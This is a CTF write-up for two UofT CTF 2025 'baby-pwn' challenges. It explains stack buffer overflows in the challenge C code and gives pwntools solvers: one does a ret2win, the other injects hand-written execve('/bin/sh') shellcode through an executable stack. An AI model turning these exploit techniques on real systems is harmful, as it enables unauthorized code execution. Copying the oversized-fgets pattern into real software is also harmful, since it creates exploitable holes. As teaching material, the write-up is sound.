# UofT CTF 2025

## baby-pwn
### challenge1
```c
void secret()
{
    printf("Congratulations! Here is your flag: ");
    char *argv[] = {"/bin/cat", "flag.txt", NULL};
    char *envp[] = {NULL};
    execve("/bin/cat", argv, envp);
}
void vulnerable_function()
{
    char buffer[64];
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
    printf("You entered: %s\n", buffer);
}
```
### approach1
* vulnerability
  * There is a buffer overflow.
```C
    char buffer[64];
    fgets(buffer, 128, stdin);
```
* ret2win
  * overwrite the return address into secret function.
  * unfortunately, printf function was called in the secret function, so overwrite the saved rbp with a known writable area.
### solver1
```py
from pwn import *

e = ELF("baby-pwn")
#p = e.process()
p = remote("34.162.142.123", 5000)
#gdb.attach(p)

offset = 72-8
payload = b"A" * offset
payload+= p64(0x00404058)
payload += p64(e.symbols["secret"]+8)

p.sendline(payload)
p.interactive()
```
## baby-pwn2
### challenge2
```c
void vulnerable_function()
{
    char buffer[64];
    printf("Stack address leak: %p\n", buffer);
    printf("Enter some text: ");
    fgets(buffer, 128, stdin);
}
```
checksec
```bash
[~/dc/ctf/uoft/baby-pwn2] >>>checksec baby-pwn-2
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
### approach2
* vulnerability
  * buffer overflow again
```c
    char buffer[64];
    fgets(buffer, 128, stdin);
```
* Stack Executable
  * the important thing is stack region is executable.
  * so the solution of this challenge is "ret2shellcode"
* shellcode
  * At first, I tried a shellcode which is available on the pwntools.
  * But something went wrong (I think the injected rbp cause that) so I wrote my own shellcode.
* First try
```py
#addr is a leaked stack address.
sh = f"""
    mov rdi, {hex(addr)} ; -> "/bin/sh"
    mov rsi, {hex(addr+16)} ; -> &["/bin/sh",NULL]
    mov rdx, {hex(addr+376)} ; -> environ
    mov rax, 59 ; execve
    syscall
"""

sh = asm(sh)
payload = b"/bin/sh\x00"
payload+= p64(0)
payload+= p64(addr)
payload+= p64(addr+8)
payload += sh
payload = payload.ljust(offset, b"A")
```
This shellcode was failed.
I thought this shellcode completely implement whole arguments to execute the `/bin/sh`.
After that, I create another shellcode that write whole arguments into .bss and .data.
* Second try
```py
sh = f"""
    mov rax, 0x68732f6e69622f
    mov [{hex(bss)}], rax
    mov rdi, {hex(bss)}
    mov [{hex(data)}], rdi
    mov rsi, {hex(data)}
    mov rdx, 0
    mov rax, 59
    syscall
"""
```
This shellcode successfully executed the shell.
### solver2
```Py
from pwn import *

e = ELF("baby-pwn-2")
p = e.process()
#gdb.attach(p)

context.arch = "amd64"
context.binary = e

#p = remote("34.162.119.16", 5000)

bss = 0x00404048
data = 0x00404020
offset = 72

p.recvuntil(b"Stack address leak: ")
addr = int(p.recvline().strip().decode(), 16)

sh = f"""
    mov rax, 0x68732f6e69622f
    mov [{hex(bss)}], rax
    mov rdi, {hex(bss)}
    mov [{hex(data)}], rdi
    mov rsi, {hex(data)}
    mov rdx, 0
    mov rax, 59
    syscall
"""
#print(shellcraft.sh())
print(len(asm(sh)))
payload = asm(sh).ljust(offset, b"A")
payload += p64(addr)

p.sendline(payload)

p.interactive()
```
